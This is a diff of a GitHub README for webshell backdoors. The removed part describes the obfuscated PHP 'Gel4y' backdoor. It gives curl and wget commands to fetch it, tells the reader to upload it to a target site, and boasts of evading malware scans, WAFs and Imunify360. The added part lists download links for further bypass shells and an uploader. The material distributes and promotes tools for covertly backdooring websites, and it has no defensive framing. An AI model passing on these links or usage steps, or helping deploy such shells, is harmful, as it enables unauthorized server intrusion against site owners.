@@ -1,52 +1,26 @@
-<h2 align="center">Gel4y Mini Shell Backdoor</h2>
-
-> A webshell that can bypass some system security, all code has been obfuscated to bypass malware scans freely.
-
+<div align="center">
+	<h1><img width="80%" src="https://readme-typing-svg.herokuapp.com?duration=03&font=Lalezar&size=30&color=00FFFF&center=true&vCenter=true&width=440&lines=+Shell+Backdoor+" /></h1>
+  <br />
 <p align="center">
-	<img src="https://img.shields.io/badge/PHP-7.4.3-yellowgreen">
-	<img src="https://img.shields.io/badge/LICENSE-MIT-orange">
-	<img src="https://img.shields.io/badge/Version-1.2-green">
-</p>
+<img alt="GitHub User's stars" src="https://img.shields.io/github/stars/beruangsalju/shell-backdoor?color=black&style=flat">
+<img src="https://img.shields.io/github/forks/beruangsalju/shell-backdoor?color=black&style=flat">
+<img src="https://img.shields.io/badge/creator%20-omest-black?style=flat">
+<img src="https://api.visitorbadge.io/api/visitors?path=https://github.com/beruangsalju/shell-backdoor&style=flat&countColor=%black"> <br>
+SHELL BACKDOOR DOWNLOADER BY OMEST
+	
+Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-black?style=flat&logo=windows&link=https://www.microsoft.com)](https://www.microsoft.com)
+[![Linux Badge](https://img.shields.io/badge/Linux-black?style=flat&logo=linux&link=https://www.linux.org)](https://www.linux.org)
+<div align="center">
+	buy me a cofee<code><a href="https://www.paypal.com/paypalme/juliawoods000"><img title="Paypal Donation" height="25" src="https://ionicabizau.github.io/badges/paypal.svg" /></a></code></div></br>
+        <b>contact me in telegram if any lost link <a href="https://t.me/haxorisland">@haxorisland</a> ( OMEST )</b></div></p>
+<div align="center"><h1><img width="80%" src="https://readme-typing-svg.herokuapp.com?font=Ubuntu&size=30&color=00FF00&center=true&vCenter=true&width=440&lines=+Shell+Downloader+2023" /></h1>
+<div align="center"> 
 
-Summary
-----------
+# <a href="https://www.mediafire.com/file/882sddgbo0rv8q6/anonghost-bypass_shell.php/file">AnonGhost Bypass</a>
+<img src="https://imgur.com/ZBxBGXu.png" alt="beruangsalju profile">
 
-Gel4y Webshell is a backdoor that was built using the PHP programming language with the PHP procedural method in stealth mode where the file size is only <20KB, using the [nano shell](https://github.com/22XploiterCrew-Team/Shellmon) method so it easily escapes virus scanning. Every PHP function has been obfuscated to avoid some firewall systems (WAF) blocking some PHP functions that are considered dangerous.
-### How To Use
-You only need to download the files in this repo, there are several easy ways that you might try
-* cURL
-  ```curl https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php -o gel4y.php```
-* wget
-  ```wget https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php```
-
-the method above will download and save to your computer, you only need to upload the webshell to the target site that you have and call it according to the name of the webshell file you downloaded.
-
-ex: ***https://server.com/gel4y.php***.
-
-Features [UPDATED]
---------
-
-* ***Obfuscated Code (not a feature in webshell)***
-* Multiple File Upload
-* Create Folder and File
-* File Download
-#### Bypassed
-* 403 Forbidden
-* 406 Not Acceptable (according to luck :>)
-* Imunify360 (not always successful, only 70% chance of success)
-
-Preview
--------
-
-<img src="https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/main/preview.png" width="800" height="550"> 
-
-Using the well-known css framework, Bootstrap version 4, so that the resulting display will adjust to your platform or more often it is called a responsive display.
-
-## Thank's To
-Thank you for the support given, we got references in making this backdoor from our friends, including:
-- IndoXploit
-- Indosec
-- Marijuana Shell
-
-### !!!
-If there is an error in this webshell, please contribute with us.
+# <a href="https://www.mediafire.com/file/0jwr4qowq1h1ep5/anonghost_bypass.php/file">AnonGhost Bypass ( Uploader )</a>
+<img src="https://i.imgur.com/OuYdN84.png" alt="beruangsalju profile">
+	
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">AK-74</a>
+<img src="https://i.imgur.com/BuzRpD8.png" alt="beruangsalju profile">
